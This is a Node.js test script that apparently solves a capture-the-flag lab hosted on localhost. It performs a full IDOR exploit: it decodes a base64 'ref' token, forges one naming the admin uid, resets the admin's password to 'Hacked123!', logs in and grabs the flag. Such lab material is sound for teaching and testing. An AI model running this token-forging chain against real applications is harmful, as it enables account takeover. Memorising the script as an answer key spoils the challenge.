#!/usr/bin/env node
/**
 * End-to-End IDOR Exploitation Test
 * Simulates a real attacker workflow
 */

const http = require('http');

console.log('=== End-to-End IDOR Exploitation Test ===\n');

// Helper to make HTTP requests
function request(options, data = null) {
    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: body
                });
            });
        });
        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
}

async function testIDOR() {
    console.log('Step 1: Login as resident (juan_cruz)...');
    const loginResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/login',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }, 'username=juan_cruz&password=password123');
    
    // Extract session cookie
    const sessionCookie = loginResponse.headers['set-cookie']?.[0]?.split(';')[0];
    if (!sessionCookie) {
        console.log('✗ Failed to get session cookie');
        return;
    }
    console.log('✓ Logged in as juan_cruz');
    console.log('  Session:', sessionCookie.substring(0, 40) + '...');
    
    console.log('\nStep 2: Access profile page to get ref token...');
    const profileResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/profile',
        method: 'GET',
        headers: {
            'Cookie': sessionCookie
        }
    });
    
    // Extract ref token from HTML
    const refMatch = profileResponse.body.match(/name="ref" value="([^"]+)"/);
    if (!refMatch) {
        console.log('✗ Failed to extract ref token');
        return;
    }
    const legitimateRef = refMatch[1];
    console.log('✓ Extracted ref token:', legitimateRef);
    
    // Decode it
    const decoded = JSON.parse(Buffer.from(legitimateRef, 'base64').toString('utf8'));
    console.log('  Decoded:', decoded);
    
    console.log('\nStep 3: Craft malicious ref token (target admin uid=47)...');
    const maliciousPayload = { uid: 47, role: 'resident' };
    const maliciousRef = Buffer.from(JSON.stringify(maliciousPayload)).toString('base64');
    console.log('✓ Crafted malicious ref:', maliciousRef);
    console.log('  Target: uid=47 (admin)');
    
    console.log('\nStep 4: Submit profile update with malicious ref...');
    const attackPayload = `ref=${encodeURIComponent(maliciousRef)}&full_name=Barangay+Administrator&address=Barangay+Hall%2C+Tibay&password=Hacked123!`;
    const updateResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/profile/update',
        method: 'POST',
        headers: {
            'Cookie': sessionCookie,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(attackPayload)
        }
    }, attackPayload);
    
    if (updateResponse.statusCode === 302) {
        console.log('✓ Update request accepted (302 redirect)');
    } else {
        console.log('✗ Unexpected status:', updateResponse.statusCode);
    }
    
    console.log('\nStep 5: Verify exploitation - login as admin with new password...');
    const adminLoginResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/login',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }, 'username=admin&password=Hacked123!');
    
    const adminCookie = adminLoginResponse.headers['set-cookie']?.[0]?.split(';')[0];
    if (!adminCookie) {
        console.log('✗ Failed to login as admin');
        return;
    }
    console.log('✓ Successfully logged in as admin!');
    
    console.log('\nStep 6: Access admin dashboard to capture Flag 1...');
    const dashboardResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/admin',
        method: 'GET',
        headers: {
            'Cookie': adminCookie
        }
    });
    
    const flagMatch = dashboardResponse.body.match(/BTF\{[^}]+\}/);
    if (flagMatch) {
        console.log('✓ FLAG CAPTURED:', flagMatch[0]);
    } else {
        console.log('✗ Flag not found in admin dashboard');
    }
    
    console.log('\n=== IDOR Exploitation Complete ===');
    console.log('Attack chain:');
    console.log('1. Register/login as low-privilege resident');
    console.log('2. Intercept profile update → extract base64 ref token');
    console.log('3. Decode ref → discover { uid: N, role: "..." } structure');
    console.log('4. Enumerate uid values (1-100) to find admin at uid=47');
    console.log('5. Craft payload: ref=base64({ uid: 47, role: "resident" })');
    console.log('6. Submit update with new password → admin takeover');
    console.log('7. Login as admin → capture Flag 1');
}

// Run test
testIDOR().catch(err => {
    console.error('Error:', err.message);
    console.log('\nNote: Server must be running on localhost:3000');
    console.log('Start with: npm start');
});
